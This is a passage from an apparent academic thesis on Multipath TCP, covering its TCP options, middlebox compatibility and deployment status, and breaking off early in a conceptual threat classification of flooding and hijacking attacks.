To achieve the required compatibility goals, changes had to be applied to the layers lower than the application layer, so that current applications do not have to be upgraded to make use of MPTCP; on the other side, the new protocol had to be placed at layers above the network layer: the network layer operates within the network infrastructure, a segment of the overall networking architecture that shouldn't be modified for MPTCP deployment. The transport layer, right above the network layer, is indeed the first component operating at the end systems: in order to get the smoothest possible widespread transition from TCP to MPTCP, the new protocol is intended to be deployed as a simple upgrade of the end systems' operating systems, with no modifications applied to the network infrastructure.

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/stack}
\caption{The TCP and MPTCP protocol stacks}
\label{fig:stack}
\end{figure}

The choice of working at the transport layer is actually the only available option. Within that option, the choice of maintaining TCP as the fundamental operating protocol for MPTCP is still straightforward for similar compatibility reasons, since TCP is used in the vast majority of services and applications globally; for this very purpose, engineers decided to add all the required data used for MPTCP inside the TCP \textit{Option} field in the TCP header. In this way, MPTCP-aware systems can process the MPTCP options for multipathing, but if a system that is not MPTCP-aware receives a MPTCP connection request, it would simply discard the MPTCP options and treat such message as a plain TCP connection-request (thanks to the TLV design of TCP \textit{Options}, as explained in the previous section). 
MPTCP design maintains the behavior of the subflows to be compliant with regular TCP, while it is the end systems that take care of splitting the payload and send it through different paths as well as reassembling the same original data at the receiver. MPTCP subflows are identified by middleboxes as regular and independent TCP connections, carrying some additional options. If security policies at the middleboxes is not too restrictive against unknown options, MPTCP-unaware intermediate nodes would still be compatible with the new protocol. MPTCP is designed to be as compatible as possible with all the most common middleboxes of the Internet of today.
For what regards applications, they don't need to be changed either since MPTCP would be added into the network stack at the operating system level: MPTCP transparently splits the data buffered from the application layer and send it through different subflows, according to the number of available endpoints at the connected hosts. Communication with the application layer can be performed through the old TCP APIs, even if MPTCP specific options can be used by upgraded applications to take advantage of more advanced functionalities offered by MPTCP.

A functional decomposition of MPTCP brings up four core functions the protocol needs in order to operate:
\begin{itemize}
  \item \textit{Path management}: MPTCP has to provide a mechanism to detect and use multiple paths between two hosts;
  \item \textit{Packet scheduling}: MPTCP fragments the byte stream received from the application in order to transmit it through different subflows, adding the required sequenced mapping used to reconstruct the same byte stream at receiver;
  \item \textit{Subflow interface}: MPTCP uses TCP to send data within a single subflow;
  \item \textit{Congestion control}: a congestion control mechanism at the MPTCP connection layer is needed to make sure that MPTCP wouldn't starve a regular TCP flow in a shared bottleneck. The congestion control component of MPTCP implements the algorithms used to decide how to schedule the various data segments (which paths and which rate to adopt).
  \end{itemize}

All the MPTCP functions are implemented internally inside the specific operating system in use on the connected device, and they use a relatively compact set of TCP \textit{Options} to operate between two hosts. Technically, there is only a single generic MPTCP option, to which has been assigned the value 30 as the TCP "Option-Kind" identifier; at a lower level there are eight MPTCP option subtypes, each identified by a 4-bit identifier value (this classification, reported in figure \ref{fig:MPTCP_options}, references to \rfc{6824}). 

\begin{figure}[!htb]
\centering
\includegraphics[width=\textwidth]{images/MPTCP_options}
\caption{The set of MPTCP options [RFC-6824]}
\label{fig:MPTCP_options}
\end{figure}

\subsection{Control plane}
The control plane for MPTCP takes into consideration all the options used in MPTCP to handle connection initiation, addition and removal of subflows, priority assignment to specific subflows, error handling via 'fallback' mechanism. These options are reported in the following subsections, adopting as reference documentation the \rfc{6824}.

\subsubsection{MP\_CAPABLE}
The connection initiation of an MPTCP connection is very similar to the standard TCP initial three-way handshake, involving a SYN, SYN/ACK and ACK exchange on a single path between host A and host B. In a regular TCP connection establishment these three packets are used to guarantee that both hosts have agreed on starting a TCP connection and also to exchange the two random initial sequence numbers that will be used to acknowledge data delivery for the two directions of the connection. Despite working as regular TCP, if MPTCP is enabled the SYN packet from host A will have a MP\_CAPABLE option in the \textit{Options} field of the TCP header. If the receiver host B is not MPTCP-compatible it will simply discard the MP\_CAPABLE option and proceeds instantiating a regular TCP connection.
In case both hosts are MPTCP-compatible, the MP\_CAPABLE option is inserted in the three packets of the initial handshake for two purposes: advertising that both hosts are indeed MPTCP-compatible and exchanging two 64-bit keys (Key-A and Key-B), according to the scheme in figure \ref{fig:mpcapable}.

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/mpcapable}
\caption{MPTCP connection initiation}
\label{fig:mpcapable}
\end{figure}

These keys are sent in clear inside the MP\_CAPABLE option only during the initial handshake (and in the case of MP\_FASTCLOSE) and their purpose is to identify a specific MPTCP connection within a host (useful when associating a new subflow to an existing MPTCP connection, for example) and to provide shared security material that is used in MPTCP for authorization mechanisms (more on this later in this section). The \textit{Option} field in the TCP header can only be 40 bytes long, and it is not reserved for MPTCP options only. For this reason it is of primary importance to keep the amount of MPTCP related information as low as possible. In fact, the original 64-bit keys are exchanged only during initial handshake; subsequently, shorter 32-bit tokens (Token-A and Token-B) derived from such keys using a digest algorithm will be used to address a specific MPTCP connection, even if this procedure requires additional checks in case of collisions with other tokens already assigned to other MPTCP connections in the same machine (despite this being a very remote possibility). There is another fundamental motivation for using this mechanism of shorter tokens: the full keys, that represent security material used in the protocol for authentication purposes (for example in MP\_JOIN and ADD\_ADDR2 messages), are exposed only during connection setup in the MP\_CAPABLE messages; sending the full keys each time a new subflow has to be started would diminish the overall security of the protocol. Therefore, an implementation requires a mapping from each token to the corresponding connection, and in turn to the keys for the connection.

Regarding the hashing algorithm used to produce the tokens, this can be negotiated by using a portion of the flag bits inside the MP\_CAPABLE option. In this paper, the SHA1 (and HMAC-SHA1 in case a key element is needed) is considered as the algorithm in use for the connections [ref to SHA1]. Note that the SHA1 algorithm produces a 160-bit resulting value, that might be then truncated to its leftmost 32 or 64 bits according to the different cases in the MPTCP operations, in order to fit in the \textit{Options} field in the TCP header.

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/opt_capable}
\caption{MP\_CAPABLE option}
\label{fig:opt_capable}
\end{figure}

\subsubsection{MP\_JOIN}
Suppose that after the first subflow is operational host A initiates a new subflow between one of its addresses and one of host B's addresses. Host A sends a TCP SYN packet to host B containing the MP\_JOIN option, which includes Token-B (the token derived from B's key) and a nonce value used to prevent replay attacks. An additional field in the MP\_JOIN option is called address ID, an identifier for the original addresses in use within a specific MPTCP connection. This additional value allows to refer to a certain address without the need to use the plain IP addresses value as identifier, which is very useful when middleboxes like NATs alter the IP header during the transit of the packets.
At the lower layers of the network, the SYN packet sent in this way looks like a legitimate request from host A to initiate a new TCP connection with host B, being the SYN packet the first of the regular TCP initial handshake. Host B processes such packet as a new MPTCP subflow request, and it uses the Token-B in the option to associate the request to the specific ongoing MPTCP connection with host A.

The handshake flow for MP\_JOIN includes HMAC values for authentication purposes, and it is structured as follow:
\begin{itemize}
  \item Token-B is added in the SYN packet from host A to host B in order to address a specific MPTCP connection; a random nonce (R-A) is also sent along;
  \begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/opt_join1}
\caption{MP\_JOIN option - SYN}
\label{fig:opt_join1}
\end{figure}
  \item Host B processes the request and sends back a truncated HMAC value calculated by using as \textit{key} the concatenation of Key-B followed by Key-A, and as the \textit{message} the concatenation of a new nonce generated at host B (R-B) and the one received from host A (R-A). R-B is also added to the option in a separate field, since it is needed by host A in the next step;
\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/opt_join2}
\caption{MP\_JOIN option - SYN/ACK}
\label{fig:opt_join2}
\end{figure}
  \item The last ACK form host A to host B contains the HMAC calculated using as key the concatenation of Key-A and Key-B, and as message the concatenation R-A and R-B. This time, the HMAC value is sent in its full length (160-bit).
\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/opt_join3}
\caption{MP\_JOIN option - ACK}
\label{fig:opt_join3}
\end{figure}
  \item Note that the HMAC in the ACK packet from host A to host B has to be acknowledged for the subflow to be finally established. In this case the third ACK is the only packet where the HMAC from host A is sent, and it has to be acknowledged or retransmitted if the fourth ACK from host B is not received.
\end{itemize}

These HMAC values are used to authenticate the participants in the subflow establishment, since both have to know the keys for the MPTCP connection in order to produce the right HMAC values. If the creation of the new subflow is not possible because A sends an unknown Token-B to host B or the HMAC material exchanged is not recognized by either hosts or the SYN/ACK received at host A misses the MP\_JOIN option, then the operation is stopped by sending a TCP RST.

%If everything works properly, the entire procedure of instantiating a MPTCP connection and add a subflow is represented with the example in figure \ref{fig:mptpcauth}. 
%\begin{figure}[!htb]
%\centering
%\includegraphics[width=0.75\textwidth]{images/mptcpauth}
%\caption{MPTCP authentication example}
%\label{fig:mptcpauth}
%\end{figure}

\subsubsection{ADD\_ADDR}
Even if a host can directly instantiate a new subflow using the MP\_JOIN option, another possibility is for the host to advertise an available address to the other machine, thus allowing the latter to instantiate the subflow.
This functionalities can be useful, for example, in a client-server configuration in which only the client is allowed to open new connections with the server: if a new interface becomes available at the server, the server itself can dynamically advertise it to the client which in turns can send the SYN+MP\_JOIN packet for subflow initiation.

This functionality is provided in MPTCP by the ADD\_ADDR option, that contains the additional address (and, optionally, port) to be advertised. To cope with NATs, the option also includes the previously mentioned address ID 8-bit integer, that has to be bounded to the new address used to create the subflow.
The ADD\_ADDR option is treated as a soft component of the overall MPTCP implementation, with no need to be sent reliably and/or be acknowledged by the receiver. The option can be added to any packet in the MPTCP connection if there is enough space in the \textit{Option} field of the TCP header, with no guarantee that such option will be received or that the receiver will indeed use the advertised information to start a new subflow. This low priority assigned to ADD\_ADDR is reasonable since the malfunctioning of this option would not break the overall data transmission, but it might only cause a missed opportunity for better multipath exploitation. For similar reasons, there is no need to ensure a proper ordering for ADD\_ADDR and REMOVE\_ADDR at the receiver (REMOVE\_ADDR, explained in the following section, is similar to ADD\_ADDR but it indicates which subflow to shut down during an MPTCP session). 

The content of the ADD\_ADDR option is shown in figure \ref{fig:addaddropt}. The IPVer field indicates if the advertised address is of kind IPv4 or IPv6, while the other fields contain the address ID, advertised IP Address and optionally the advertised port.

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/addaddropt}
\caption{ADD\_ADDR option}
\label{fig:addaddropt}
\end{figure}

\subsubsection{REMOVE\_ADDR}
If an address becomes unavailable during a MPTCP connection, the affected host should announce this so that any subflow currently using that address can be terminated. For security purposes, when a REMOVE\_ADDR is received, a test is performed to make sure that the address is not available anymore, by sending a TCP keepalive on the path.
The address ID is used to identify the path to be shut down, so that no explicit address is needed (and no IP address field is in fact present in the REMOVE\_ADDR option): in this way the option works through NATs. 
A subflow that is working properly must not use this option to close the connection when the data transfer is complete, but a FIN exchange similar to regular TCP is performed instead.

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/opt_remove}
\caption{REMOVE\_ADDR option}
\label{fig:opt_remove}
\end{figure}

\subsubsection{MP\_FASTCLOSE}
This option can be thought as the MPTCP-level counterpart of the RST signal for the regular TCP connections: it permits the abrupt closure of the whole MPTCP connection. The RST signals couldn't trigger such behavior, since they are confined to work against a single TCP flow (i.e. an MPTCP subflow).

This option can be sent by host A to trigger MPTCP closure at host B. In this case, MP\_FASTCLOSE must contain the value of Key-B. When host B receives the option through one of the subflows, it will send a TCP RST answer via the same subflow and then tears down all the subflows. Host A is waiting for the TCP RST answer from host B before tearing down all the subflows. This generic behavior might change slightly if both hosts send an MP\_FASTCLOSE at the same time, or if the awaited TCP RST signal is not received within a certain timeout (this would trigger a limited number of retransmissions for this option).

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/opt_fastclose}
\caption{MP\_FASTCLOSE option}
\label{fig:opt_fastclose}
\end{figure}

\subsubsection{MP\_FAIL}
There are various cases in which things might go wrong for a MPTCP connection, and the right procedure to handle such cases is to 'fallback', meaning either switching to regular TCP or removing the subflow generating the issue. The first solution has been already encountered for the MP\_CAPABLE exchange, where TCP fallback is guaranteed in case a host is not MPTCP compatible. Similarly, subflow addition will be blocked if anything goes wrong in the MP\_JOIN packets' exchange procedure. However, there are other cases in which problems occur after this initiation phases, on regular packets. 
As explained later in section \ref{dataplane}, data acknowledgment in MPTCP requires a DSS option present in the ACK packets. If that option is missing, the path is not considered MPTCP capable. The consequences are different according to the subflow: if the affected path is the first instantiated with the MP\_CAPABLE option then it must fallback to regular TCP; any other subflow showing such problem would be closed with a RST message. 
The fallback procedure can be required at any point during the connection if a middlebox modifies the data stream. This case would be detected thanks to the checksum properties of MPTCP data transfer. If checksum fails, all data from the failing segment onwards cannot be trusted anymore. When this happens to a subflow, it has to be immediately closed with a RST and a MP\_FAIL option that indicates the data sequence number that failed the checksum: such option indeed contains a single main field storing the full 64-bit sequence number. The receiver can then avoid to acknowledge untrusted data, that will be sent again through a different subflow following the retransmission features of the data plane part of the MPTCP protocol. 

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/opt_fail}
\caption{MP\_FAIL option}
\label{fig:opt_fail}
\end{figure}

\subsubsection{MP\_PRIO}
It is possible to indicate if a path has to be used regularly or just as backup in case there no other available regular paths. This preference can be advertised at subflow creation via a flag in the MP\_JOIN option, but it is also possible to signal a priority change at any time during the MPTCP connection. In fact, it is enough to send the MP\_PRIO option to the targeted subflow to signal the other host about the change; it is also possible to add an address ID to explicitly target a specific subflow that might be different with respect to the one used to send the MP\_PRIO option. This option is only sent from the receiver to the sender, even if the sender can discard such priority preference for any reasons. 

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/opt_prio}
\caption{MP\_PRIO option}
\label{fig:opt_prio}
\end{figure}

\subsection{Data plane}
\label{dataplane}
This part concerns the MPTCP option used to manage the data flow in a MPTCP connection, including how the payload byte stream is split and sent through different subflows and how the original order of the packets is provided at the receiver.

\subsubsection{DSS option}
\label{dss}
The DSS options contains all the fields needed to maintain ordering information about the octet sent during the MPTCP session, so that the correct data received from (possibly) multiple subflows can be reassembled at the receiver. DSS option also includes the DATA-ACK flag for acknowledgement purposes and the equivalent of a TCP FIN for the overall MPTCP connection, meaning that the current mapping covers the final data from the sender (figure \ref{fig:mptcp_fin}). Finally, this option might also include the checksum field to perform integrity checks on the payload (if this was enabled when instantiating the connection via the MP\_CAPABLE option).

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/mptcp_fin}
\caption{Closing a MPTCP connection}
\label{fig:mptcp_fin}
\end{figure}

Regarding the data sequence mapping in MPTCP, the general idea is to maintain TCP-compliant and independent sequence numbers for the single subflows, while using a mapping functionality at the MPTCP-level, provided by the DSS option, to properly rearrange the data at the receiver and guarantee in-order and reliable overall transmission as in the case of legacy TCP. The alternative approach would have been to have a single MPTCP-level sequence number used for the entire set of subflows, meaning that a single subflow inspected by middleboxes would look like a TCP connections with holes in the payload delivery; this could trigger unwanted behaviors that would be against the compatibility goals of MPTCP.

The DSS option achieves data sequence mapping with the combination of three fields: for a certain number of bytes (indicated in the \textit{Data-Level Length} field) and starting from the reported subflow sequence number (\textit{Subflow Sequence Number} field), the TCP-level sequence maps to the MPTCP-level sequence with starting value indicated in the \textit{Data Sequence Number} field.
The DATA-ACK flag works as regular TCP ACK flag, but it refers to the MPTCP-level acknowledgment of the received data. Note that subflow-level acknowledgement is still provided by regular TCP, but a second acknowledgement mechanism at connection-level is desired, since there might be cases in which data that has been acknowledged at the subflow-level can still be discarded in the buffers before reaching the application. By following the core principles of MPTCP, retransmission of packets can occur at different paths.

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/opt_dss}
\caption{DSS option}
\label{fig:opt_dss}
\end{figure}

\section{MPTCP deployment}
%Add some images for middleboxes or deployment status graphs
A seamless transition towards MPTCP on current infrastructures is a major requirement for MTPCP deployment.
Despite the big effort in designing a protocol compliant with strict compatibility requirements, assuring correct functioning in all the current network scenarios is not a viable possibility for MPTCP. The main problematics are related to unwanted behavior of middleboxes processing unknown MPTCP packets, but that is not the only aspect currently limiting the deployment status of the new protocol. MPTCP has to guarantee the same levels of reliability, performance and security of regular TCP (including the cases in which the fallback mechanism is adopted to switch to plain TCP). 
As reported in the following sections, MPTCP includes various mechanisms to cope with the most common middleboxes of today's Internet, including the possibility to detect when external boxes operate on the traffic in a way that cannot be handled by MPTCP thus triggering fallback to regular TCP.

\subsection{Middleboxes compatibility}
The Internet at its core was designed to provide end-to-end connectivity across an infrastructure of interconnected routers. Nevertheless, the growing rate of adoption and increasing complexity of the Internet brought up a wide set of new requirements directly involving the intermediate stages of the communication rather then the end-hosts. Such requirements include the need to instantiate protection techniques against potential attacks, more flexibility in content delivery, caching for more efficient communication; they can even be more specific, like the need to rapidly overcome the IPv4 addresses depletion. Middleboxes are pieces of equipment that operate on the network traffic to meet these requirements. The most common middleboxes are NATs, proxies and firewalls, but nowadays there is a huge variety of deployed middleboxes that inevitably break the end-to-end principle of the Internet. Despite their usage is often required, they are more or less intrusive at different layers according to where they operate within the OSI architectural model, thus causing malfunctioning of many protocols, and MPTCP is no exception. Middleboxes can indeed inspect packets, re-route them, drop them, split them into multiple fragments, and even modify single fields in packets' headers (like rewriting sequence number or removing TCP options) as well as change their payload.

The various operations and purposes of middleboxes are many and often mixed together to achieve more complex policies, and it is very common that different kind of operations are performed inside the same physical machine. Despite this, it is possible to define a set of most common distinct middleboxes' operations [\href{https://queue.acm.org/detail.cfm?id=2591369}{href}], reported in the following sections.

\subsubsection{Firewalls}
A simple example can be the case of a standard firewall that is not MPTCP-aware and its default policy is set to "deny". In this case, all the traffic is blocked apart from the connections and/or packets compliant with the set of custom rules explicitly configured in the firewall. In this case, specific rules for MPTCP must be added to support the new protocol, and this might cause a considerable effort for network maintainers. For example, it is often not straightforward to operate on legacy firewall configurations for big companies with many access points.

A more subtle problem with firewalls might be derived by the fact that they can sometimes manipulate the sequence numbers of a TCP connection, thus shifting the sequence number space with respect to the initial value in use by the end-hosts. This feature has been introduced in the past to improve security with older TCP/IP stacks, but the concept could have disrupted MPTCP mapping between subflow sequence number and MPTCP-level sequence number. To avoid such problems, MPTCP is designed so that the mapping in the DSS option is using relative values compared to the initial sequence number and correct functioning is not jeopardized but changes of the absolute values performed by the firewalls.

Yet another case concerns firewalls that remove unknown TCP options for security purposes. If such operation is symmetric, TCP segments would lose the MP\_CAPABLE option and fallback seamlessly to regular TCP. However, there are middleboxes that operates asymmetrically thus removing unknown TCP options only inside non-SYN segments. To cope with this, MPTCP requires that for the first window of data, each segment must include an MPTCP option, otherwise fallback is performed [\href{http://conferences.sigcomm.org/co-next/2013/workshops/HotMiddlebox/program/p37.pdf}{href}].

\subsubsection{NATs}
Another ubiquitous piece of equipment is the "Network Address Translation" (NAT). As the name suggests, NATs modify the IP addresses within the packets on their way towards the destination. The main purpose is to group addresses of an internal private network and map them to a single public address before forwarding the traffic to the Internet. NATs are also able to redirect the response from the Internet to the right host in the internal network.
This procedure became very common with the depletion of IPv4 addresses, since in many cases the address space assigned to a outer portion of the Internet is not large enough to cover the number of hosts willing to acquire connectivity. 
NATs turned out to be a very effective way to temporarily solve the problem of IPv4 addresses, but their mode of operation is intrusive at the network and transport layer, since the IP addresses are not fixed anymore.
For example, even if NATs use internal tables to keep track of the mappings and are able to redirect replies from the external network to the right internal host, it is no more possible for the external hosts to instantiate a new connection with a specific host residing behind a NAT. This is true also in MPTCP, such that a server often cannot open a new subflow with a client if the latter is behind a NAT, even if a valid MPTCP session between client and server is already active. This is one of the main use cases in which an ADD\_ADDR message can be sent on live subflows in order to trigger a new subflow connection request from the other side.
Moreover, to cope with NATs that might be operational on the paths and might change the source address of the packets, MPTCP options refer to addresses by using an address ID instead of the plain IP address value. 

\subsubsection{Segment splitting and coalescing}
There are middleboxes that split segments on the Internet as required by the MTU (maximum transmission unit). This means that the payload of a single TCP packet can be scattered across multiple smaller TCP packets and regrouped back together by using the appropriate TCP fields in the header. This operation usually copies TCP options unchanged into each of the smaller packets that are generated. By simply adopting data sequence numbers for the overall MPTCP-level data transfer, the receiver might receive different packets with identical data sequence numbers and it would be unable to reconstruct the original data. MPTCP takes care of segment splitting and coalescing by mapping the subflow-level TCP sequence number with the MPTCP-level sequence, by providing both the beginning (with respect to the subflow sequence number) and the length of the of the data-sequence mapping (as explained in section \ref{dss}).
MPTCP would work also in the more uncommon cases in which segment splitters copy the original TCP option in only one of the generated smaller segments. If the first data-segment does not contain an MPTCP option, fallback to regular TCP is performed, otherwise MPTCP would work seamlessly even under these circumstances [\href{http://conferences.sigcomm.org/co-next/2013/workshops/HotMiddlebox/program/p37.pdf}{href}].

\subsubsection{Application-level gateways}
There are middleboxes that operate at higher layer in OSI model, modifying the payload of the packets: adding and removing bytes can change the boundaries of the data-sequence mapping and MPTCP information about it would become inconsistent. The only way to cope with this case is to fallback to regular TCP. In order to that, MPTCP has to detect when the payload has been changed by middleboxes and that is the main reason for which the checksum field has been added inside each and every DSS option. The checksum calculation is optional in MPTCP and can be negotiated during connection establishment with a flag in the MP\_CAPABLE option. Nevertheless, it is recommended for operations on the open Internet.

\subsection{Deployment status}
MPTCP proves to be a major TCP extension, and in this regards its design required a lot of efforts and several interconnected research projects. The European Commission funded the work at the Université catholique de Louvain with the FP7 Trilogy project in 2007 [\href{http://www.trilogy-project.org/}{href}], followed by CHANGE [\href{http://www.change-project.eu/}{href}] and Trilogy 2 [\href{http://trilogy2.it.uc3m.es/}{href}]. Fundings have been instantiated by Google and Nokia, too [\href{https://multipath-tcp.org/pmwiki.php}{href}]. 
By analyzing the main steps in MPTCP evolution it is possible to detect the big interested in the protocol: six month after the Experimental Standard for MPTCP has been published in January 2013 by the IETF, there were already three major independent MPTCP implementations other than the Linux kernel implementation [\href{https://datatracker.ietf.org/doc/draft-eardley-mptcp-implementations-survey/?include_text=1}{href}], including a FreeBSD implementation from Swinburne University of Technology [\href{http://lists.freebsd.org/pipermail/freebsd-net/2013-March/034882.html}{href}] and a NetScalar Firmware implementation from Citrix Systems [\href{https://www.citrix.com/blogs/2013/05/28/maximize-mobile-user-experience-with-netscaler-multipath-tcp/}{href}].
Moreover, recent versions of MPTCP (from 0.89.5) are now compatible with Android (with some limitations), and many porting projects have been developed to test older versions of MPTCP on various Android devices [\href{https://multipath-tcp.org/pmwiki.php?n=Users.Android}{href}].
As of June 2015, a Solaris implementation is reportedly under development by Oracle [\href{https://mailarchive.ietf.org/arch/msg/multipathtcp/ugMIu566McQMn8YCju-CTjW9beY}{href}].
All these implementations follows the standard RFC documentation for MPTCP, and they have shown good interoperability capabilities while being tested with the reference MPTCP-compatible Linux kernel, especially for what regards the core MPTCP signaling messages (secondary MPTCP features, like ADD\_ADDR address advertisement, are not always implemented [\href{https://datatracker.ietf.org/doc/draft-eardley-mptcp-implementations-survey/?include_text=1}{href}]).

The very first large scale commercial deployment of MPTCP dates back to 2013, when Apple introduced the new protocol in iOS7 to work with the intelligent personal assistant Siri. Apple's mobile operating system implements MPTCP as in \rfc{6824} (excluding some features) in order to use cellular data subflow in case the Wi-Fi connectivity becomes unavailable during a Siri request processing [\href{https://support.apple.com/en-us/HT201373}{href}]. This is indeed the first example of wide adoption of MPTCP over the Internet even if limited to a specific Apple service connecting to proprietary servers. Nevertheless, the news was helpful in spreading the awareness about the protocol to a more consumer-oriented audience. Apple also added MPTCP capabilities to Mac OS X 10.10 in October 16, 2014 [\href{http://labs.neohapsis.com/2014/10/20/mptcp-roams-free-by-default-os-x-yosemite/}{href}], proving to be very active in developing and testing MPTCP.

In studying the protocol's deployment process, it is very important to analyze the relation between costs and benefits that MPTCP would bring to each and every group of MPTCP stakeholders.
The success of MPTCP depends on its deployment, and its deployment strongly depends on endpoints. It has already been mentioned the interest shown by OS authors towards MPTCP, which naturally fits the pre-deployment stage. But eventually it will be the end-users to decide the future for MPTCP: they are the ones directly accessing the biggest part of MPTCP benefits as described in section \ref{benefits}. Without considering middleboxes interference, there is conceptually no need for technical modifications at the intermediate infrastructure to make MPTCP available at the end-users. Nevertheless, connectivity providers (ISPs) still represent an important part of the entire set of stakeholders that might benefit from MPTCP wide adoption: multipathing can directly improve resource utilization and congestion bottlenecks within the overall infrastructure, but it can also be seen by ISPs as an enabler of new business models, since end users might show an increased interest in multihoming solutions [\href{https://books.google.de/books?id=ECBxhiURlKYC&pg=PA23&lpg=PA23&dq=mptcp+deployment&source=bl&ots=_cvPxxdH6K&sig=P5AlF9bU_iE3C63HfXvgD77tUg8&hl=en&sa=X&ved=0ahUKEwi0wMnuscfKAhUB1hQKHT0cARsQ6AEIUzAI#v=onepage&q&f=false}{href}]. End users' feedback and ISPs' feedback for MPTCP do and will drive the interest of infrastructure vendors to better support the protocol or not inside their middleboxes. 
Yet another case study involves data infrastructure maintainers, that can be considered a smaller but important subset of end users. In this case it is fundamental the value that MPTCP can bring to data centers of today as well as the possibilities enabled by MPTCP for the design of the data centers of the future [\href{http://conferences.sigcomm.org/sigcomm/2011/papers/sigcomm/p266.pdf}{href}].

All these considerations are difficult to analyze in the real world, thus making it hard to predict future trends for MPTCP adoption. Current applications of MPTCP rarely detach from experimental branches and little is known on how the new protocol would behave in the Internet if globally enabled. Excluding the MPTCP usage for Siri and Apple's servers, the closest example of real world usage of MPTCP has been setup and analyzed by the Université catholique de Louvain: the experiment consisted in collecting a dataset about traffic usage for an MPTCP-enabled Web server exposed to the open Internet in November 2014 [\href{http://inl.info.ucl.ac.be/system/files/paper_8.pdf}{href}]. The Web server was running the stable version 0.89 of the MPTCP implementation in the Linux Kernel and using a single physical network interface supporting both IPv4 and IPv6. As for the content, the Web server was hosting the Multipath TCP implementation in the Linux kernel, a common destination for early adopters of the new protocol. After on week of monitoring, the dataset included around 122 millions of TCP packets destined to the Web server and roughly a quarter of those were MPTCP packets for a total of 5098 observed MPTCP connections. 
An interesting fact about the analyzed ADD\_ADDR packets showed that clients advertised mostly private addresses (79\% of the IPv4 advertised addresses), thus confirming the importance of MPTCP being able to pass through NATs. 
The final evaluation for this experiment demonstrated that MPTCP works properly in the open Internet if the Application Level Gateways (ALGsaddress ID) are handled by protecting the payload using the checksum in the DSS option (a feature enabled on server side for the entire set of 5098 MPTCP connections).

For what regards the current numbers MPTCP-enabled clients and servers around the world, such information is not easy to retrieve. For this purpose, a service has been built by NICTA (Sidney) and Simula Research Laboratory (Oslo), to scan the most common Web servers for the websites retrieved from the Alexa Top 1M list and check for MPTCP compatibility. This test is run between once a day and once a week, so that a live dashboard showing the retrieved data over time is maintained [\href{https://academic-network-security.research.nicta.com.au/mptcp/deployment/}{href}]. According to their latest results, the rate of adoption of MPTCP from the scanned IP addresses and domains is around 0.1\% [\href{http://www.nicta.com.au/publications/research-publications/?pid=8791}{href}], showing that the current status is far from large scale adoption.
\chapter{MPTCP security}
\label{chap:mptcpsecurity}

\section{Threats analysis}
A complete security evaluation of MPTCP can be subdivided into two main categories:

\begin{itemize}
  \item A first perspective is to study of the vulnerabilities in the current MPTCP design that can be exploited to carry out flooding or hijacking attacks on an MPTCP session. This is an assessment on how consistently the MPTCP extension would impact the security standards of a plain TCP connection;
  \item A second perspective is to understand how the new protocol affects the functioning and behavior of external security equipment. This evaluation might include compatibility issues for middleboxes not yet aware of MPTCP as well as more fundamental problematics related to monitoring solutions that wouldn't work anymore with MPTCP: by splitting the logic flow of data into different paths, potentially belonging to different ISPs, it would be much harder to keep track of the content of the transmitted data over the networks. Moreover, the MPTCP ability to reroute traffic on the fly, adding and removing addresses and interfaces, would per se cause major problems with current intrusion detection and intrusion prevention mechanisms.
\end{itemize}

This paper focuses on the first point: MPTCP enables data transmission using multiple source-destination address pairs per endpoint and this generates \textit{new} scenarios in which an attacker can exploit the way subflows are generated, maintained and destroyed to perform flooding or hijacking attacks. 
Flooding attacks are Denial-of-Service procedures that aim at overloading an MPTCP host with connection requests in order to quickly consume its resources.
Hijacking attacks aim at taking total control of the MPTCP session.

MPTCP security mechanism was designed with the primary goal of being at least as good as the one currently available for standard TCP, as clearly stated in \rfc{6181}. The official MPTCP documentation and analysis reports don't cover common threats affecting both TCP and MPTCP, but only the vulnerabilities introduced by the new protocol alone. Nevertheless, it is of paramount importance that the various security mechanisms deployed as part of standard TCP, for example mitigation techniques for reset attacks, are still compatible with Multipath TCP. Apart from the fundamental objective of keeping MPTCP at least as reliable and secure as TCP, official documents offer another set of requirements mainly related to securing subflow management in MPTCP. These requirements, found in \rfc{6824bis}, are:
\begin{itemize} 
\item Provide a mechanism to confirm that the parties in a subflow handshake are the same as in the original connection setup;
\item Provide verification that the peer can receive traffic at a new address before using it as part of a connection;
\item Provide replay protection, ensuring that a request to add/remove a subflow is fresh.
\end{itemize}

MPTCP involves an extensive usage of hash-based handshake algorithms to achieve the required security specifications, as described in \autoref{chap:multipathtcp}. 

Once the security requirements are clear, it follows a set of related problematics due to the way MPTCP is added to the regular TCP stack. The entire behavior of the protocol relies on the TCP \textit{Options} field, which is of limited length of 40 bytes. This factor plays an important role in the definition of the security material to be exchanged during an MPTCP session (truncating the HMAC values and using shorter tokens are common techniques). Moreover, TCP \textit{Options} field has been designed to accept any custom protocol extending TCP and for security reasons many middleboxes would discard or modify packets containing unknown options. As a last point, MPTCP approach to subflow creation implies that a host cannot rely on other established subflows to support the addition of a new one (as reported in section 5.8 of \rfc{RFC6182}): this last requirement follows the \textit{break-before-make} property of MPTCP, that must be able to react to a subflow failure a posteriori by establishing new subflows and automatically sending again the undelivered data. All these considerations define the fundamental boundaries and the context in which the security design of MPTCP has to be developed to meet the requirements.

\subsection{Threats classifications}
Introducing the support of multiple addresses per endpoint in a single TCP connection does result in additional vulnerabilities compared to single-path TCP. These new vulnerabilities need proper investigation in order to determine which of them can be considered critical and might require modifications in the protocol design in order to meet the required specifications. In order to classify how critical each security threat is, it is a good starting point to define the various typologies of attack according to their requirements, rate of success and what power they can provide to the attacker.
The general requirements for an attack to be executed might be grouped into the following categories (from \rfc{7430}):

\begin{itemize}  
\item \textit{Off-path attacker}: the attacker does not need to be located in any of the paths of the MPTCP connection at any time in order to execute the attack;
